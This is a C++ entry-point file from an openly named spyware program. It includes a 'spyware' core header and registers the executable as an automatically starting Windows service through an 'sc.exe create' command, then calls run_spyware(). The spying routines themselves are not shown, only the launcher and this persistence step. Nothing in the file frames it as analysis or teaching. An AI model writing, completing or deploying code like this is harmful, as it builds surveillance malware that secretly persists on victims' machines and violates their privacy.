#include <iostream>

#include "config.h"
#include "core/spyware.hpp"

int main (int argc, char *argv[]) {
    std::string exePath (argv[0]);
    std::string firstArgs = argc > 1 ? std::string(std::string(argv[1])) : "";

    std::cout << exePath << std::endl;
    
    if (argc < 1 || firstArgs.compare("--run") != 0) {
        std::string registerServiceCmd = "sc.exe create ";
        
        registerServiceCmd += PROGRAM_NAME;
        registerServiceCmd += " start=auto binpath=";
        registerServiceCmd += "\"" + exePath + " --run\""; 

        std::system(registerServiceCmd.c_str());
    }


    return run_spyware();
}